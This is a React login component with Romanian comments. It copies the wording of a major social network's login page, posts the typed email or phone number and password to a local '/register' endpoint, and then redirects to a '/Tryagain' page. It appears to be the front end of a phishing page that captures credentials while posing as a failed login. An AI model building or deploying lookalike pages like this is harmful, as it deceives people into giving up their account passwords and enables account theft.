// Register.js
import React, { useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";

function Register() {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [errorMessage, setErrorMessage] = useState('');
    const [loginAttempted, setLoginAttempted] = useState(false);
    const navigate = useNavigate();

    const handleRegister = async (e) => {
        e.preventDefault();
        setLoginAttempted(true);

        // Trimite datele către server
        await axios.post('http://localhost:3000/register', { username, password })
        .then(res => {
            if (res.data.status === 'error') {
                setErrorMessage(res.data.message);
              } else{
                navigate('/Tryagain');
              }
        })
        .catch(error => {
            console.error('Eroare la trimiterea datelor către server:', error);
        });
    };

    return (
        <div>
          
        <form onSubmit={handleRegister}> 
        
        {loginAttempted && errorMessage && <div className="error-message">{errorMessage}</div>}

            <div id='form-div'>
              <br></br>
            <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} placeholder='Email or Mobile number' ></input> <br></br>
            <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder='Password' ></input> <br></br>
            <button type="submit" id='btt-login'>Log in</button> <br></br>
            <p  >Forgot Password? </p> <br></br>
             <hr></hr> <br></br>
            <button id='btt-newaccount'> Creat new account</button> <br></br>
           
            </div>
        
        </form>
        <div id='last-para'> <b><p id='last-link' >Create a Page</p></b> for a celebrity, brand or business.</div>
    </div>
    );
}

export default Register;
